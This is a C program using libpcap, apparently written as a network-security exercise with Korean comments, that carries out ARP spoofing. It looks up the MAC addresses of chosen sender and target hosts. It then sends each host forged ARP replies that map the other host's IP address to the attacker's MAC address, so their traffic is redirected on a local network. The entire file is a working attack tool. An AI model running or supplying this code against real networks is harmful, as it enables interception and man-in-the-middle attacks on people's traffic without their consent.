#include <pcap.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <stdlib.h>

// ARP 관련 상수 정의
#define ARP_REQUEST 1  // ARP 요청 코드
#define ARP_REPLY 2    // ARP 응답 코드
#define ETHERNET_HEADER_LENGTH 14  // 이더넷 헤더 길이
#define ARP_HEADER_LENGTH 28  // ARP 헤더 길이
#define ARP_PACKET_LENGTH (ETHERNET_HEADER_LENGTH + ARP_HEADER_LENGTH)  // ARP 패킷 전체 길이
#define ETHERNET_TYPE_ARP 0x0806  // 이더넷 타입: ARP
#define HARDWARE_TYPE_ETHERNET 0x01  // 하드웨어 타입: 이더넷
#define PROTOCOL_TYPE_IPV4 0x0800  // 프로토콜 타입: IPv4
#define MAC_ADDRESS_LENGTH 6  // MAC 주소 길이 (바이트)
#define IP_ADDRESS_LENGTH 4  // IP 주소 길이 (바이트)

// 패킷 데이터를 저장할 버퍼
u_char packet_buffer[ARP_PACKET_LENGTH];

// pcap 라이브러리 핸들러
pcap_t* pcap_handle;

// 네트워크 인터페이스 관련 정보 구조체
struct ifreq interface_request;
unsigned char attacker_mac_address[MAC_ADDRESS_LENGTH];   // 공격자의 MAC 주소

// 이더넷 헤더 구조체 정의
struct ethernet_header {
    u_char destination_mac[MAC_ADDRESS_LENGTH];  // 목적지 MAC 주소
    u_char source_mac[MAC_ADDRESS_LENGTH];  // 출발지 MAC 주소
    uint16_t ethernet_type;  // 상위 프로토콜 타입 (ARP)
};

// ARP 헤더 구조체 정의
struct arp_header {
    uint16_t hardware_type;  // 하드웨어 타입 (이더넷)
    uint16_t protocol_type;  // 프로토콜 타입 (IPv4)
    u_char hardware_address_length;  // 하드웨어 주소 길이 (MAC 주소)
    u_char protocol_address_length;  // 프로토콜 주소 길이 (IP 주소)
    uint16_t operation_code;  // ARP 요청 또는 응답 코드
    u_char sender_mac_address[MAC_ADDRESS_LENGTH];  // 송신자의 MAC 주소
    u_char sender_ip_address[IP_ADDRESS_LENGTH];  // 송신자의 IP 주소
    u_char target_mac_address[MAC_ADDRESS_LENGTH];  // 수신자의 MAC 주소
    u_char target_ip_address[IP_ADDRESS_LENGTH];  // 수신자의 IP 주소
};

// 프로그램의 사용법을 출력하는 함수
void print_usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

// 네트워크 인터페이스의 MAC 주소를 가져오는 함수
void get_mac_address(const char* interface_name, u_char* mac_address) {
    // 소켓 생성
    int socket_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (socket_fd < 0) {
        perror("socket");
        exit(1);
    }

    // 인터페이스 이름 설정
    strncpy(interface_request.ifr_name, interface_name, IFNAMSIZ - 1);

    // ioctl 호출을 통해 MAC 주소 가져오기
    if (ioctl(socket_fd, SIOCGIFHWADDR, &interface_request) != 0) {
        perror("ioctl");
        close(socket_fd);
        exit(1);
    }

    // MAC 주소를 지정된 버퍼에 복사
    memcpy(mac_address, interface_request.ifr_hwaddr.sa_data, MAC_ADDRESS_LENGTH);
    close(socket_fd);  // 소켓 종료
}

// ARP 패킷을 생성하고 전송하는 함수
void send_arp_packet(pcap_t* pcap_handle, uint32_t sender_ip_address, uint32_t target_ip_address, u_char* sender_mac_address, u_char* target_mac_address, uint16_t operation_code) {
    // 이더넷 헤더와 ARP 헤더를 패킷 버퍼에 연결
    struct ethernet_header* eth_hdr = (struct ethernet_header*)packet_buffer;
    struct arp_header* arp_hdr = (struct arp_header*)(packet_buffer + ETHERNET_HEADER_LENGTH);

    // 이더넷 헤더 설정
    if (operation_code == ARP_REQUEST) {
        // ARP 요청의 경우 목적지 MAC 주소를 브로드캐스트로 설정 (FF:FF:FF:FF:FF:FF)
        memset(eth_hdr->destination_mac, 0xff, MAC_ADDRESS_LENGTH);  
    } else {
        // ARP 응답의 경우 목적지 MAC 주소를 타겟의 MAC 주소로 설정
        memcpy(eth_hdr->destination_mac, target_mac_address, MAC_ADDRESS_LENGTH);
    }

    // 이더넷 헤더의 출발지 MAC 주소와 이더넷 타입 설정
    memcpy(eth_hdr->source_mac, attacker_mac_address, MAC_ADDRESS_LENGTH);
    eth_hdr->ethernet_type = htons(ETHERNET_TYPE_ARP);

    // ARP 헤더 설정
    arp_hdr->hardware_type = htons(HARDWARE_TYPE_ETHERNET);  // 하드웨어 타입: 이더넷
    arp_hdr->protocol_type = htons(PROTOCOL_TYPE_IPV4);  // 프로토콜 타입: IPv4
    arp_hdr->hardware_address_length = MAC_ADDRESS_LENGTH;  // MAC 주소 길이 설정
    arp_hdr->protocol_address_length = IP_ADDRESS_LENGTH;  // IP 주소 길이 설정
    arp_hdr->operation_code = htons(operation_code);  // ARP 요청 또는 응답 코드 설정

    // 송신자의 MAC 주소와 IP 주소 설정
    memcpy(arp_hdr->sender_mac_address, attacker_mac_address, MAC_ADDRESS_LENGTH);
    memcpy(arp_hdr->sender_ip_address, &sender_ip_address, IP_ADDRESS_LENGTH);

    // ARP 요청 및 응답에 따라 타겟 MAC 주소 설정
    if (operation_code == ARP_REQUEST) {
        // ARP 요청: 타겟 MAC 주소는 미지정 (0x00)
        memset(arp_hdr->target_mac_address, 0x00, MAC_ADDRESS_LENGTH);  
    } else {
        // ARP 응답: 타겟 MAC 주소를 타겟의 MAC 주소로 설정
        memcpy(arp_hdr->target_mac_address, target_mac_address, MAC_ADDRESS_LENGTH);
    }

    // 타겟 IP 주소 설정
    memcpy(arp_hdr->target_ip_address, &target_ip_address, IP_ADDRESS_LENGTH);

    // 패킷을 전송하여 ARP 요청 또는 응답을 수행
    if (pcap_sendpacket(pcap_handle, packet_buffer, ARP_PACKET_LENGTH) != 0) {
        fprintf(stderr, "Failed to send ARP packet: %s\n", pcap_geterr(pcap_handle));
        exit(1);
    }
}

// Sender의 MAC 주소를 얻기 위해 ARP 요청을 보내고, ARP 응답을 받는 함수
void get_sender_mac(pcap_t* handle, uint32_t sender_ip_address, uint32_t target_ip_address, u_char* sender_mac_address) {
    // ARP 요청을 보냄
    send_arp_packet(handle, target_ip_address, sender_ip_address, attacker_mac_address, "\x00\x00\x00\x00\x00\x00", ARP_REQUEST);

    // ARP 응답을 수신하여 Sender의 MAC 주소를 알아냄
    while (1) {
        struct pcap_pkthdr* header;
        const u_char* packet_data;
        int res = pcap_next_ex(handle, &header, &packet_data);
        if (res == 0) continue;  // 타임아웃인 경우 계속 반복
        if (res == -1 || res == -2) break;  // 에러 발생 시 종료

        struct ethernet_header* eth_hdr = (struct ethernet_header*)packet_data;
        if (ntohs(eth_hdr->ethernet_type) != ETHERNET_TYPE_ARP) continue;  // ARP 패킷이 아닌 경우 무시

        struct arp_header* arp_hdr = (struct arp_header*)(packet_data + ETHERNET_HEADER_LENGTH);
        if (memcmp(arp_hdr->sender_ip_address, &sender_ip_address, IP_ADDRESS_LENGTH) == 0) {
            memcpy(sender_mac_address, arp_hdr->sender_mac_address, MAC_ADDRESS_LENGTH);  // Sender의 MAC 주소 저장
            break;
        }
    }
}

int main(int argc, char* argv[]) {
    // 사용자가 입력한 인자 개수가 올바르지 않으면 사용법 출력
    if (argc < 4 || argc % 2 != 0) {
        print_usage();
        return 1;
    }

    // 네트워크 인터페이스 이름 및 MAC 주소 가져오기
    char* interface_name = argv[1];
    get_mac_address(interface_name, attacker_mac_address);

    // pcap 라이브러리 초기화
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_handle = pcap_open_live(interface_name, BUFSIZ, 1, 1000, errbuf);
    if (pcap_handle == NULL) {
        fprintf(stderr, "Failed to open device %s: %s\n", interface_name, errbuf);
        return 1;
    }

    // 여러 쌍의 (Sender, Target)에 대해 ARP 스푸핑 수행
    for (int i = 2; i < argc; i += 2) {
        uint32_t sender_ip_address = inet_addr(argv[i]);
        uint32_t target_ip_address = inet_addr(argv[i + 1]);
        u_char sender_mac_address[MAC_ADDRESS_LENGTH];
        u_char target_mac_address[MAC_ADDRESS_LENGTH];

        // Sender와 Target의 MAC 주소를 얻음
        get_sender_mac(pcap_handle, sender_ip_address, target_ip_address, sender_mac_address);
        get_sender_mac(pcap_handle, target_ip_address, sender_ip_address, target_mac_address);

        // ARP 스푸핑 패킷 전송
        send_arp_packet(pcap_handle, target_ip_address, sender_ip_address, target_mac_address, sender_mac_address, ARP_REPLY);
        send_arp_packet(pcap_handle, sender_ip_address, target_ip_address, sender_mac_address, target_mac_address, ARP_REPLY);
    }

    pcap_close(pcap_handle);  // pcap 세션 종료
    return 0;
}
